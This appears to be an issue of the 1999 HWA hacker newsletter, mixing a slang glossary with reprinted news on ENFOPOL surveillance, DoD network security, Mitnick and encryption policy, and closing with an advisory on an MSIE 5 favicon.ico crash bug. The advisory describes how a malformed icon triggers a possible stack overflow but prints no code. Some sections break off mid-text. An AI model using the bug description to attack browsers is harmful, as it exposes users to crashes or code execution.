   Synopsis 
   ---------
   
   The purpose of this newsletter is to 'digest' current events of interest
   that affect the online underground and netizens in general. This includes
   coverage of general security issues, hacks, exploits, underground news
   and anything else I think is worthy of a look see. (remember i'm doing
   this for me, not you, the fact some people happen to get a kick/use
   out of it is of secondary importance).

    This list is NOT meant as a replacement for, nor to compete with, the
   likes of publications such as CuD or PHRACK or with news sites such as
   AntiOnline, the Hacker News Network (HNN) or mailing lists such as
   BUGTRAQ or ISN nor could any other 'digest' of this type do so.

    It *is* intended  however, to  compliment such material and provide a
   reference to those who follow the culture by keeping tabs on as many
   sources as possible and providing links to further info, its a labour
   of love and will be continued for as long as I feel like it, i'm not
   motivated by dollars or the illusion of fame, did you ever notice how
   the most famous/infamous hackers are the ones that get caught? there's
   a lot to be said for remaining just outside the circle... <g>

    WANTED!: POSTCARDS! YESH! POSTCARDS, I COLLECT EM so I know a lot of you are
    ~~~~~~~  reading this from some interesting places, make my day and get a
             mention in the zine, send in a postcard, I realize that some places
             it is cost prohibitive but if you have the time and money be a cool
             dude / gal and send a poor guy a postcard preferably one that has some
             scenery from your place of residence for my collection, I collect stamps
             too so you kill two birds with one stone by being cool and mailing in a
             postcard, return address not necessary, just a  "hey guys being cool in
             Bahrain, take it easy" will do ... ;-) thanx.



    Ideas for interesting 'stuff' to send in apart from news:

    - Photo copies of old system manual front pages (optionally signed by you) ;-)
    - Photos of yourself, your mom, sister, dog and or cat in a NON
      compromising position plz I don't want pr0n. <g>
    - Picture postcards
    - CD's 3.5" disks, Zip disks, 5.25" or 8" floppies, Qic40/80/100-250
      tapes with hack/security related archives, logs, irc logs etc on em.
    - audio or video cassettes of yourself/others etc of interesting phone
      fun or social engineering examples or transcripts thereof.

    If you still can't think of anything you're probably not that interesting
    a person after all so don't worry about it <BeG>

    About the Bugtraq mailing list
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    The following comes from Bugtraq's info file:

    This list is for *detailed* discussion of UNIX security holes: what they are,
    how to exploit, and what to do to fix them.

    This list is not intended to be about cracking systems or exploiting their
    vulnerabilities. It is about defining, recognizing, and preventing use of
    security holes and risks.

    Please refrain from posting one-line messages or messages that do not contain
    any substance that can relate to this list`s charter.

    I will allow certain informational posts regarding updates to security tools,
    documents, etc. But I will not tolerate any unnecessary or nonessential "noise"
    on this list.

    Please follow the below guidelines on what kind of information should be posted
    to the Bugtraq list:

      Well what does HWA stand for? never mind if you ever find out I may
     have to get those hax0rs from 'Hackers' or the Pretorians after you.

     In case you couldn't figure it out hax0r is "new skewl" and although
     it is laughed at, shunned, or even pidgeon holed with those 'dumb
     leet (l33t?) dewds' <see article in issue #4> this is the state
     of affairs. It ain't Stephen Levy's HACKERS anymore. BTW to all you
     up  and comers, i'd highly recommend you get that book. Its almost
     like  buying a clue. Anyway..on with the show .. - Editorial staff

  00.5  HWA FAQ v1.0 Feb 13th 1999 (Abridged & slightly updated again)
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    Also released in issue #3. (revised) check that issue for the faq
    it won't be reprinted unless changed in a big way with the exception
    of the following excerpt from the FAQ, included to assist first time
    readers:

    Some of the stuff related to personal useage and use in this zine are
    listed below: Some are very useful, others attempt to deny the any possible
    attempts at eschewing obfuscation by obsucuring their actual definitions.

    @HWA   - see EoA  ;-)

    !=     - Mathematical notation "is not equal to" or "does not equal"
             ASC(247)  "wavey equals" sign means "almost equal" to. If written
             an =/= (equals sign with a slash thru it) also means !=, =< is Equal
             to or less than and =>  is equal to or greater than (etc, this aint
             fucking grade school, cripes, don't believe I just typed all that..)

    AAM    - Ask a minor (someone under age of adulthood, usually <16, <18 or <21)

    AOL    - A great deal of people that got ripped off for net access by a huge
             clueless isp with sekurity that you can drive buses through, we're
             not talking Kung-Fu being none too good here, Buy-A-Kloo maybe at the
             least they could try leasing one??

   *CC     - 1 - Credit Card (as in phraud)
             2 - .cc is COCOS (Keeling) ISLANDS butthey probably accept cc's

    CCC    - Chaos Computer Club (Germany)

   *CON    - Conference, a place hackers crackers and hax0rs among others go to swap
             ideas, get drunk, swap new mad inphoz, get drunk, swap gear, get drunk

             not least, get drunk.
   *CRACKER - 1 . Someone who cracks games, encryption or codes, in popular hacker
                 speak he's the guy that breaks into systems and is often (but by no
                 means always) a "script kiddie" see pheer
              2 . An edible biscuit usually crappy tasting without a nice dip, I like
                  jalapeno pepper dip or chives sour cream and onion, yum - Ed

    Ebonics - speaking like a rastafarian or hip dude of colour <sic> also wigger

             weird crap on irc, hence when someone says something stupid or off topic

   *HACKER - Read Stephen Levy's HACKERS for the true definition, then see HAX0R

   *HAX0R - 1 - Cracker, hacker wannabe, in some cases a true hacker, this is difficult to
            define, I think it is best defined as pop culture's view on The Hacker ala
            movies such as well erhm "Hackers" and The Net etc... usually used by "real"
            hackers or crackers in a derogatory or slang humorous way, like 'hax0r me

 03.0  The FBI and the ENFOPOL wiretapping secret organization ILETS
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       From HNN http://www.hackernews.com/
        
       contributed by weld 
       
       An FBI-founded organization called ILETS, which has met in secret for 6 years, has led
       initiatives around the world to build comprehensive interception systems into new 
       telecommunications systems. This include requiring European ISPs to have special sniffing
       equipment installed on their networks. 

       ILETS AND THE ENFOPOL 98 AFFAIR

       THE ENFOPOL 98 AFFAIR

       SPECIAL INVESTIGATION: ILETS AND THE ENFOPOL 98 AFFAIR

      Duncan Campbell   29.04.99 

      America's guiding hand revealed - the secret international organisation behind Europe's
      controversial plans for Internet surveillance 

                 

      Europe's 21st century tapping plans were born in an unlikely location. Fifty kilometres south of Washington
      DC, on the swampy western boundaries of the Potomac river is Quantico, Virginia. Here, on a large military
      reservation, is the FBI's training academy and research and development centre. Members of the public
      have no access to the high security site. 

      Between 1990 and 1992, the FBI had tried repeatedly to get the US Congress to pass new laws for telephone
      tapping. The agency was worried that new digital telephone systems did not allow them easy access to track and
      intercept their targets. Their goal was to turn every type of modern communications systems into a national and,
      ultimately, global surveillance network which would give them "real time, full time" access to those whom they wanted to
      watch. 

      The FBI experts ignored the costs imposed by their demands. They wanted manufacturers and network operators to
      provide systems at their own expense. Nor were they interested in the checks and balances of laws intended to control
      monitoring and protect privacy. Lawyers were not invited. Civil society would have to pay its own costs. 

                         Faced with the roadblocks in Congress, early in 1993 the FBI tried a new approach. They
                         invited US allies to come to Quantico. Law enforcement and security agency representatives
                         met there, calling themselves the "International Law Enforcement Telecommunications
                         Seminar". Seen in retrospect, the title "seminar" is a black joke. Acting in secret and without
                         parliamentary knowledge or government supervision, the FBI through ILETS has since 1993
      steered government and communications industry policy across the world. In the shadows behind the FBI stood the
      NSA (National Security Agency), whose global surveillance operations could only benefit if, around the world, users
      were systematically to be denied telecommunications privacy in the information age. 

      The countries who came to Quantico in 1993 were traditional US intelligence allies like Canada, the UK and Australia.
      There was also a core Euro group interested in developing extended surveillance systems - Germany, France, the
      Netherlands, Sweden (and the UK). Other representatives came from Norway, Denmark, Spain and even Hong Kong.
      The FBI tabled a document called "Law Enforcement Requirements for the Surveillance of Electronic
      Communications", written in July 1992. 

      In June 1993, EU ministers meeting in Copenhagen agreed to poll member states on the issues raised by the FBI and
      by ILETS. After discussions in Europe later in 1993, ILETS met in Bonn early in 1994. By now Austria, Belgium,
      Finland, Portugal and Spain had joined the 19 member group. 

                         At their Bonn meeting, ILETS agreed joint policy in a document called "International
                         Requirements for Interception". This said that "law enforcement representatives and
                         government telecommunications experts from a number of countries that attended an
                         international workshop on interception and advanced telecommunications technologies
                         identified the need for this document". It was their "common requirements". Attached to the
      two page ILETS policy paper was a detailed, four page set of monitoring requirements and a glossary. This list of
      "International User Requirements" was identified as "IUR 1.0" or "IUR95". 

      The ILETS meeting in Bonn also instigated two new policies. ILETS wanted international standards bodies such as the
      ITU (International Telecommunications Union) and ISO (International Standards Organisation) to build in tapping
      requirements to new system specifications. ILETS also wanted governments to agree on monitoring across international
      boundaries, so that one agency could intercept communications in another country. 

      In March 1994, the Dutch government proposed that Europe adopt IUR 1.0. But ministers were not told that the
      document had been written by ILETS. Instead, it was identified as an ENFOPOL document, eventually being called
      ENFOPOL 90. (ENFOPOL is a standard European Commission classification for documents concerned with Law
      Enforcement/Police matters.) 

      European Ministers never discussed ENFOPOL 90. It was agreed by a "written procedure", by exchange of telexes. It
      remained completely secret for nearly two years, and was not published in the Official Journal of European policy until
      November 1996. Meanwhile, European telecommunications operators were told to fall in line with its requirements.
      According to the British Home Office (Interior Ministry), for example, the resolution is "used as a basis for discussion
      with telecommunications operators in accordance with [UK monitoring legislation]". 

      ILETS had also raised the problem of satellite-based mobile phone systems (such as Iridium). These phone systems link
      subscribers via satellites that are not under government control. This led to a British proposal to the European
      Commission: 





       "Governments ... will have to create new regulations for international co-operation so that the necessary surveillance
       will be able to operate." 






      In a slightly modified form, IUR 1,0 became law in the United States in October 1994. Other European nations, and
      Australia, later incorporated it in their domestic legislation. Within two years from the first ILETS meeting, the IUR had,
      unacknowledged and word for word, become the secret official policy of the EU and law around the world. 

      Sixteen Nations from ILETS met again in Canberra in 1995 and agreed to try and persuade international standards
      organisations to adopt the IUR "requirements". This would mean that manufacturers of new exchanges or
      communications systems would have to build in interception interfaces in order to meet the international standards, free
      of charge. If this ploy succeeded, then security and law enforcement agencies would save money and make tapping
      easier, since new networks would come with monitoring systems built in. 

                         At their Canberra meeting "participating countries undertook to write to "relevant standards
                         bodies and committees" informing them that their country along with other countries has
                         adopted the IUR as a basis for its national and system-specific requirements .... ". 
                         Once again ILETS succeeded. In June 1997, the Australian government persuaded the
                         International Telecommunications Union (ITU) to adopt the IUR requirements as a "priority".
                         They told the ITU that "some countries are in urgent need of results in this area". 

      During 1995 and 1996, through the European Commission, ILETS also effectively turned the IUR into an international
      treaty. The EU invited countries who had attended ILETS meetings to endorse the still-secret 1995 monitoring policy -
      that is, IUR 1.0. 

      Non-EU ILETS members were told that "the Council considers that the lawful monitoring of telecommunications
      systems is an important tool in the prevention and detection of serious crimes and in safeguarding national security. ...
      The Member States of the European Union have been called upon to apply those Requirements to telecommunications
      operators and service providers... " Canada, Australia, Norway and the United States wrote back to the EU president,
      confirming their agreement 

      By now, ILETS had spawned two sub committees, one re-designing the IUR and another (called STC, the Standards
      Technical Committee) working on technical standards. ILETS and its experts met again in Dublin in 1997. In 1998,
      they met in Rome, Vienna and Madrid. The IUR was not changed in 1997. But ILETS and its expert committees were
      at work, defining new requirements to cover the Internet and satellite based systems. They also wanted stringent new
      security requirements to be imposed on private telecommunications operators. 

                         The expert committees drew up new "requirements" to intercept the Internet. During July
                         1998, ILETS experts met in Rome to settle the new IUR and its attached "glossary". The
                         result was  ENFOPOL 98 . In Vienna on 3 September 1998, the revised IUR was
                         presented to the Police Co-operation Working Group. The Austrian Presidency proposed
                         that, as had happened in 1994, the new IUR be adopted verbatim as a Council Resolution on
                         interception "in respect of new technology". Delegates were told that ENFOPOL 98's purpose
      was to "clarify the basic document (IUR 1.0) in a manner agreed by the law enforcement agencies as expressing their
      common requirement". 

      But ILETS and its experts had become overconfident. IUR 1.0 had been four pages long. The new IUR (ENFOPOL
      98) was 36 pages. The Austrian officials were told that this was politically inadvisable - perhaps that it would frighten
      ministers by its explicitness. Or, as the IUR experts were later told, "the wide range covered by ENFOPOL 98 was not
      conducive to ready comprehension". 

      In October 1998, ILETS' IUR experts met in Vienna and Madrid and agreed a shorter, 14 page paper. Some of its
      more controversial provisions were put into other papers. European police delegates met in November to consider and
      agree the revised ENFOPOL 98 (rev 1). 

      Suddenly, there was a new factor for the ILETS experts to consider. On 20 November, Telepolis  broke the
      ENFOPOL 98 story, publishing the full text in German nine days later. The story became Internet news around the
      world. After this, and thanks to two further revisions by the German presidency, ENFOPOL 98 (now renamed
      ENFOPOL 19 - see  news story ) shrank to a mere 6 pages long. Its key provisions are being hidden elsewhere. 

      The most chilling aspect of the ILETS and ENFOPOL story may not even be the way in which the US-led organisation
      has worked in the dark for more than 6 years to built snooping trapdoors into every new telecommunications system.
      Their determination to work in the dark, without industry involvement or legal advice, without parliamentary scrutiny or
      public discussion, has blinded them to the idea that not all "law enforcement" is a public good. 

      Throughout its life, Hong Kong - now incorporated in the People's Republic of China - has been a member of ILETS.
      By planting its requirements on bodies like the ITU and ISO, the police and security agencies involved have effectively
      acted as an international treaty organisation. 

      But they were blind to any interests other than their own narrow world-view. "In the name of law and order, the US is
      now pursuing an international accord that urges stronger surveillance capabilities in nations with appalling human-rights
      records" says Susan Landau, co-author of Privacy on the Line. 

      By taking Hong Kong into their club, they have shared their advanced ideas on surveillance with the butchers of
      Tienanmen Square. By seeking the ITU's imprimatur on building surveillance into new communications systems, they
      have handed the vile butchers of the Kosovans and the Kurds the future tools to seek out and murder their opponents.
      The new IUR will be welcome news in Thailand and Singapore, and everywhere where enemies of liberty thrive. 

      Even if you are a conservative European or US politician, this can only be a source of shame. ILETS has thrown the
      vital principles of the European Convention and the US Constitution into the dustbin. That, above all, is why the secret
      processes of ENFOPOL 19, 98 and the rest should be brought to a halt. Democratic society requires nothing less than
      full and considered public discussion of these important issues.

       THE ENFOPOL 98 AFFAIR

      Duncan Campbell   29.04.99 

      Euro police press on ... and America's guiding hand is revealed 

                 

      THE LATEST VERSION of the ENFOPOL 98 interception plan has just been leaked in London. It reveals
      that although the name of the key document has been changed, European Commission officials still want to
      make tapping the Internet official European policy by the end of May. They are pressing on, despite strong
      domestic opposition in  Germany and Austria and recent  condemnation by the European Parliament. 

      The new document is called ENFOPOL 19. It was obtained this week by Caspar Bowden of the London-based
        Foundation for Information Policy Research . 

      ENFOPOL 19 was written at a police officials' meeting in Brussels on 11 March, and was issued by the German
      presidency on 15 March. According to the British government, "the German Presidency has indicated that it hopes to
      seek agreement to the draft Council Resolution at the Justice and Home Affairs Council in May". The Council will meet
      on 27-28 May. 

      ENFOPOL 19 still concerns "interception of telecommunications in relation to new technologies". But instead of
      detailing massive new requirements for tapping the Internet and other new communications systems, the police group is
      now pretending that it is not a new policy at all. 

      Referring to the first European tapping plan of 1995, ENFOPOL 19 says that "the requirements of law enforcement
      agencies ... are applicable both to existing and new communications technologies, for example satellite
      telecommunications and Internet telecommunications". Thus, it claims, the "technical terms" in the 1995 plan "are to be
      interpreted as applying to ... in the case of the Internet, the static and dynamic IP address, credit card number and
      E-mail address". In fact, the  1995 policy says nothing about credit card numbers being used to tap
      telecommunications. 

      The new document points out that when tapping the Internet, it is not necessary to ask for the details of the sender and
      the recipient, because these are included in every "datagram" or IP packet. So new regulations for the Internet may not
      be needed. 

      But this is a deceptive manoeuvre. Successive redrafts of ENFOPOL 98 reveal that the original, highly controversial
      plan exposed by Telepolis has been broken up into at least five parts, which are now being handled separately: 

           Plans for tapping Iridium and other satellite-based personal communications systems have been separated and
           are being discussed at a high level in the Commission; 

           Part of ENFOPOL 98 which set out new requirements for personal data about subscribers will be included in
           "other Council Resolutions to be adopted"; 

           Another resolution will require Internet Service Providers to set up high security interception interfaces inside
           their premises. These "interception interfaces" would have to be installed in a high security zone to which only
           security cleared and vetted employees could have access. This is not included in ENFOPOL 19; 

           ENFOPOL 19 also suggests that some tapping systems could operate through a "virtual interface". This would
           mean installing special software at Internet access points, controlled remotely by government security agencies. 

           A fourth new policy concerning cryptography is now being dealt with separately. 

      The police group now plan that the old and new resolutions will be put into a monitoring "manual", together with detailed
      instructions on intercepting the Internet. This will include "technical descriptions" which have been taken out of the
      original  ENFOPOL 98 . If this manoeuvre succeeds, then ENFOPOL 98 will escape scrutiny by being smuggled
      through in parts, while the European Parliament is dissolved (because of the June Euro-elections). 

      But the biggest secret about ENFOPOL 98 has never been told, until now. The controversial document wasn't written
      by European governments or the European Commission. Both ENFOPOL 98 and Europe's 1995 monitoring policy
      were written by a US-dominated group of security and law enforcement agency experts, called ILETS. This group
      does not include any industry or human rights and privacy law advisers. 

      Over the last six years, ILETS has single-handedly forced governments and international standards bodies to build in
      their "requirements" to laws, networks and new communications systems. Their activities have never been reported to
      national Parliaments, the European Parliament or even the US Congress. 

      Not until Telepolis revealed the ENFOPOL 98 affair has the secret ILETS organisation been exposed or challenged.

 04.0  NIPRNET to beef up security by *koff* installing firewalls...(wah hahahahaha)

       NIPR to install Firewalls to Thwart Hackers 

       From HNN http://www.hackernews.com/
        
       contributed by erehwon 
       The factual inaccuracies in this article are blatant. The Defense Information Systems Agency (DISA) plans to
       redesign its Non-Classified Internet Protocol Router  Network (NIPRNet). While this article touts this
       'redesign' as some sort of massive undertaking it sounds like they are just going to install a few firewalls. 
       Oh, yeah, that will keep all the hackers out.

      DOD net overhaul to thwart hackers

      BY BOB BREWIN (antenna@fcw.com)

      The Defense Department has started an overhaul of its global unclassified
      network to fight off the barrage of hacker attacks the department's systems
      suffer and to increase capacity to handle a huge rise in traffic to and from the
      Internet.

      The Defense Information Systems Agency plans to redesign its
      Non-Classified Internet Protocol Router Network, DOD's primary entry into
      commercial World Wide Web sites, to take advantage of enhanced security
      measures and to improve overall performance.

      The NIPRNET redesign, scheduled for completion in December with main
      network components slated for installation no later than June, will provide
      DOD with a network better designed to stave off hacker attacks that hit
      DOD systems at a rate of 250,000 a year, according to a DOD source
      briefed on the network plan. 

      Tony Montemarano, chief of Defense Information Systems Network services
      for DISA, said the agency is well on its way with the NIPRNET upgrade.
      "The equipment is purchased, and we are upgrading software loads,"
      Montemarano said.

      He said that besides providing security, the NIPRNET upgrade also will
      provide "protection against denial-of-service attacks.... We want to be able to
      guarantee the availability of the network as well as provide additional security
      for the users."

      DISA's plans include the filtering of what DISA called "notorious" protocols
      routinely exploited by hackers, according to briefing slides obtained by
      Federal Computer Week.

      The protocols include the PostOffice Protocol (POP), which allows remote
      users to read e-mail stored on a central server; remote-access protocols,
      which allow users to read their e-mail from another system; and Packet
      Internet Groper (Ping), which hackers use to disable networks by overloading
      them with a command. 

      According to the briefing slides, DISA plans to start filtering out these
      protocols by July. But the agency said it has not made any decision yet on
      which protocols to filter.

      Montemarano declined to quantify the degree of security that the NIPRNET
      upgrade will provide, except to say, "It will be better...and performance will
      be improved considerably."

      DISA is doubling the number of NIPRNET connections to the Internet
      because of the huge increase in traffic spurred by the development of the
      World Wide Web and the amount of information residing on Web sites
      outside NIPRNET, Montemarano said. "There is so much information out
      there our users want," he said. 

      Increasing capacity also is a security measure. The inability of NIPRNET to
      handle the loads imposed by Web traffic without lags or delays had resulted in
      numerous military commands installing Internet "backdoors" on their systems.

      DISA is looking to eliminate such backdoor connections. According to the
      DISA briefing, no unit or command will be allowed to connect a local- or
      wide-area network to NIPRNET until the network goes through a formal
      connection approval process. 

      Rear Adm. John Gauss, commander of the Space and Naval Warfare
      Systems Command, said he believes the NIPRNET redesign offers a better
      security alternative than the almost total retreat from the Internet advocated by
      Lt. Gen. William Campbell, the Army's director of information systems for
      command, control, communications and computers. 

      "Campbell accurately addressed the threat," Gauss said, "but the thing I have
      to ponder is, [considering] the amount of electronic commerce we do with
      industry, is it viable just to disconnect from the Internet? What DISA is doing
      will protect DOD computing and still give us a viable means of communicating
      with industry."

       Heard on the Beat 
       Firms Say Hacker Cost Them $291 Million 
       By GREG MILLER
       LA Times               


      For a guy who never seemed to profit from his hacking habit, Kevin Mitnick sure took a
      big bite out of the high-tech economy, if newly disclosed damage estimates from his victim
      companies are to be believed. Mitnick's hacking cost high-tech companies at least $291.8 
      million over a two-year span before his capture, according to estimates provided to the
      FBI by NEC America Inc., Nokia Mobile Phones, Sun Microsystems Inc. and Novell Corp. 
      The damages are listed in previously undisclosed letters that were obtained by 2600
      magazine, a pro-hacker publication that has posted the letters on its Web site. 
           
           The damage estimates vary widely. NEC said Mitnick stole software code worth $1.8 million.
      But Nokia figures Mitnick cost the company at least $135 million, including $120 million in lost
      revenue "due to new developments being delayed in reaching the market." 
      Skeptics say the estimates border on fantasy and point out that the companies did not report
      these hefty setbacks in public financial statements.But the estimates underscore the ambiguities of
      assessing damages in hacking cases.Some argue that hackers should be accountable for the cost of
      developing the software they steal, even though they are only taking a copy. Mitnick himself once
      argued that was akin to saying someone who shoplifts a 49-cent Bic pen ought to be accountable for
      the millions of dollars Bic has spent developing and marketing it.The issue is still significant for
      Mitnick, who pleaded guilty to various hacking charges last month but awaits a ruling on the restitution
      he will be ordered to pay victims. "We're going to make a submission for an amount of restitution we 
      consider appropriate," said Assistant U.S. Atty. Chris Painter, "not necessarily the full amount of the
      loss that was caused."

      April 30, 1999 

      Catching Hackers Becoming Easier

      ASSOCIATED PRESS

      NEW YORK (AP) -- They never unmasked the hacker responsible for Michelangelo, a famous computer
      virus that threw a scare into the high-tech world in 1992.

      But it took just days to identify the people believed responsible for two viruses that struck this year.
      Cybercops also had no trouble finding the man who allegedly posted a fake news story this month about a
      corporate merger that caused one company's stock to gyrate.

      In at least two of these cases, investigators used the digital footprints that every user of the Internet
      leaves behind to trace the source of the trouble.

      While this may force virus writers or hoaxers to think twice before they strike, it also shows how easy it 
      is for anyone -- a government investigator or a skilled salesperson -- to follow your every online move.

      "The same technology that tracks individuals is used to solve crimes and vice versa," said Ari Schwartz, a
      policy analyst for the Center for Democracy and Technology, an Internet civil liberties group in
      Washington. "It's melded into one kind of surveillance technology which could lead to an erosion of privacy."

      Actually, there's nothing all that complicated about how the law enforcers crack a case on the World Wide
      Web. In fact, it's similar to the way telephone records are used by investigators.

      The online accounts that most people use to roam the Web or send e-mail are assigned a unique stamp, or
      "Internet protocol address," that helps direct the exchange of data between a Web site and its visitors.

      Those IP addresses leave digital footprints that -- unfortunately for the ill-intentioned -- don't get wiped
      out as easily or quickly as a trail of bread crumbs.

      Little is known about Chen Ing-hau, the 24-year-old Taiwanese man identified on Thursday as the author
      of Chernobyl, a virus that crippled hundreds of thousands of computers this week. But IP addresses
      were clearly pivotal in tracking down the alleged merger hoaxter, Gary Dale Hoke.

      The 25-year-old North Carolina man was arrested two weeks ago after he allegedly posted a fictional story
      April 7 saying his employer, PairGain Technologies, was about be taken over by another company. The
      false report caused PairGain's stock to rise sharply, then fall after the hoax was uncovered.

      Hoke, officials said, attempted to conceal his identity with pseudonyms and fake e-mail addresses, but was
      identified through an IP address. He was charged Friday with five counts of securities fraud, punishable
      by up to 50 years in prison and $5 million in fines. IP addresses were also used to track down David L.
      Smith, a 30-year-old network programmer from New Jersey accused of creating the Melissa e-mail virus
      with a stolen America Online account.

      Melissa, allegedly named after a topless dancer in Florida, appeared on March 26 and spread rapidly
      around the world, clogging e-mail accounts and shutting down computer networks worldwide.

      But IP addresses weren't the only clues used in the Melissa investigation, and that's what troubles privacy
      advocates.

      The main difference in the Melissa investigation was the use of a serial number embedded in documents
      written with the popular program Microsoft Word.

      "We could go around society with tattoos on our forehead and cameras everywhere, but most people
      wouldn't like that. But that's what these serial numbers do," said Schwartz, whose organization has filed a
      federal complaint over a similar serial number embedded in Intel's new Pentium III computer chip.

      "Law enforcement has a lot of tools out there to find out who these people are. We want them to find
      crooks," Schwartz said.

      "But when we make technology, do we want technology that brands individuals, that's puts our
      serial numbers everywhere as we visit? There has to be some sense of anonymity online."

      U.S. advisor seeks full-blown
      debate on encryption 

      May 4, 1999

      (IDG) -- The chairman of an organization that advises the U.S. Congress on Internet issues yesterday said he
      would like to see a campaign-style debate on encryption pitting members of Congress and the Clinton administration
      who oppose relaxing U.S. encryption laws against U.S. lawmakers who favor loosening them. 

      Jerry Berman, chairman of the Congressional Internet Caucus Advisory Committee, said he would push for the
      debate to be held sometime this year. He added that he would favor participation from U.S. lawmakers who have 
      spoken out against relaxing U.S. restrictions on the export of encryption technology above 56 bit. 

      "I want a face-to-face debate," Berman said during a luncheon for congressional staff members sponsored by the
      caucus. "Let them go at it." 

      Sen. Diane Feinstein (D-Calif.) and Rep.Michael Oxley (R-Ohio) would be ideal participants, Berman said. And the
      director of the FBI Louis Freeh would be another good candidate to take part in the debate.But there has been no
      agenda or date set for the event, Berman said. 

      The two lawmakers and Freeh have opposed legislation that would change the current U.S. encryption law on the 
      grounds that it would weaken law enforcement's ability to catch suspected criminals, particularly terrorists and
      drug dealers, because they could use the high-level encryption to prevent access to potential evidence stored on 
      their computers. 

      Supporters of a change in U.S. encryption law say those arguments are baseless because high-level encryption is
      easily obtainable and the U.S. law has only hamstrung American businesses who want to sell and use such
      encryption outside the U.S. 

      Berman announced that, in addition to the encryption forum, the caucus by year-end would hold forums on privacy,
      content and broadband technology.

      "The goal is to educate policy makers about the Internet as a technology," Berman said. "We need to explain to 
      policy makers what these issues are." 

      The Internet Caucus Advisory Committee comprises 120 public interest groups, corporations and associations. 
      Members typically favor maintaining the decentralized, deregulated global aspects of the Internet, Berman said.
      He added that the caucus got off the ground because Congress passed the Communications Decency Act (CDA) without
      first asking itself whether it fully understood technology and how the Internet works. 

      The CDA was later ruled unconstitutional by the Supreme Court.

 09.0 Product: Hackers stopped cold by 'BlackICE'?

      Start-up puts hackers on
      BlackICE 

      April 22, 1999
      Web posted at: 1:35 p.m. EDT (1735 GMT)

      by Ellen Messmer                              


      (IDG) -- Network Ice, a hot security start-up for intrusion detection, this June plans to ship its
      first software-based suite  for stopping the wily hacker cold. 

      To protect Windows-based desktops and  servers from hack attacks, Network Ice is providing software 
      called BlackICE Pro. If BlackICE software spots evidence of mischief, it responds by alerting the user
      or the administrator of the problem. It can also shut down all communication to and from the source of
      the intrusion attempt. 

      BlackICE Pro software, which costs $37 per node for 1,000 nodes, will issue a report of any trouble to 
      the Web-based security management console called ICEcap (an acronym for "consolidation, analysis and 
      presentation"). 

      According to Greg Gilliom, CEO of Network Ice, the ICEcap reporting engine uses a technology dubbed 
      "Collective Awareness" to analyze the nature of the intrusion attempt. If needed, it will inform all
      BlackICE-protected desktops or servers if a systemic corporate-wide attack appears to be under way. 

      Since hackers are constantly upgrading their attack exploits, the BlackICE software is going to have to
      be updated regularly, much like anti-virus software, Gilliom points out. To do this, ICEcap can "push"
      intrusion-detection updates down to BlackICE software without disrupting computer activity. 

      "We detect over 200 attack signatures, such as ping sweeps or denial-of-service attacks,"
      Gilliom claims. "We're protocol experts - we know how to exploit protocols. But we're trying
      to provide a system of administration and protection for small companies that aren't aware
      of all these issues." 

      Gilliom and the other Network Ice co-founders  Robert Graham and Clinton Lum all held senior
      engineering positions at Network General (now Network Associates after its merger last year with McAfee
      Associates). 

      The BlackICE suite is host-based intrusion-detection software for Windows.
      The start-up is also working on an NT-based probe called BlackIce Sentry
      that would be able to scan for trouble Unix machines, mainframes or
      databases. The company has no specific shipping date for BlackIce Sentry. 

      Network Ice Chief Technology Officer Robert Graham says that one of the most vulnerable points within 
      the enterprise network today is that presented by the telecommuter or remote access user. 

      "The problem with VPNs and notebook computers is that firewalls are being bypassed by remote dial-in users,"
      Graham says. "When we've put our software on a lot of people's machines, we see virtually everyone will 
      undergo a hacker attack within just a few weeks." 

      This is because the hackers with their automated tools are targeting remote access users to find out their 
      IP addresses or access methods in order to weasel their way into the corporate intranet, Graham claims. 
      
      Therefore, even companies using VPNs or firewalls can benefit from a desktop-based intrusion-detection system
      used for remote access. "We see three types of hackers out there," Graham says. "There are voyeurs, like 
      peeping toms; graffiti artists that trash the Web site and tell their friends; and criminals who steal things,
      such as customer lists."

       as the culprit).
       
       
         If anyone can shed some light on this (really bad) issue, it'd be

 11.0  More on the MSIE favicon.ico bug       
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
       http://web.cip.com.br/flaviovs/sec/favicon/index.html 
        
       MSIE 5 favicon bug
       
       Description
       
       There's a bug in MSIE 5 when handling the favicon.ico file downloaded from a web site. By creating a icon file with bad data, it's possible to crash MSIE 5. The
       stack is filled with information from the icon file so it may be possible to create an icon file with data which would end executing code on the client machine. 
       
            The favicon.ico icon file
       
            The favicon.ico file is an icon file in the MS-proprietary icon file format. It is downloaded by MSIE 5 when the user asks it to add the
            page's URL to his/her "Favorites" list. When the user selects to add the URL, MSIE 5 downloads the file and shows the icon on the
            "Favorites" menu. The request for the favicon.ico file is first done on the same path of the current URL. If the file is not found, MSIE 5
            will backup one directory in the directory hierarchy and try again. It will do this until it finds the file or reaches the web server root (e.g. if
            you try to bookmark this page, MSIE 5 will look for favicon.ico in http://web.cip.com.br/flaviovs/sec/favicon/,
            http://web.cip.com.br/flaviovs/sec/, http://web.cip.com.br/flaviovs/ and http://web.cip.com.br/). 
       
       Impact
       
       MSIE 5 will crash when trying to interpret/show such icon file. It's unknown if it's possible to create an icon file which will trigger code execution on the client
       machine, but evidences show that it may be possible (i.e. it looks like a stack buffer overflow). 
       
       Workaround
       
       It seems it's not possible to turn off the favicon.ico loading feature. Thus the only workaround is not to add any non-trusted site to the "Favorites" list and wait for
       a patch from Microsoft. 
       
       Example
       
       If you're using MSIE 5 with Javascript enabled, you can feel the bug in action. Otherwise just try to bookmark this page (note: this will crash your browser). 
       
       Here's the favicon.ico file that triggers the bug. It's composed of an bogus header followed by lots of "A" characters. 
       
       What Microsoft is Doing
       
       Apparently, nothing. I reported the bug twice, the first one about one month ago, the last time about two weeks ago. I didn't receive any reply.

       Privacy Issues about the favicon.ico File

       Description
       
       Every time you bookmark a page in MSIE 5 it will send to the web server a request for a file named favicon.ico (see "MSIE 5 favicon bug" for an explanation
       about what this file is, along other nice things). This give to web servers admins a way to know that someone has bookmarked it's site; the info includes the date and
       time of the operation plus the address IP of the machine which bookmarked the site. This may or may not bother you. 
       
       Impact
       
       MSIE 5 will reveal to web servers admins that you bookmarked their sites. 
       
       Workaround
       
       It seems that it's not possible to turn off this feature, so if this bother you, don't bookmark sites with MSIE 5 or don't use it at all. 
       
       What Microsoft is Doing
       
       Microsoft was not contacted about this issue. They were already informed about a a much more dangerous issue about the favicon.ico file and took no measure
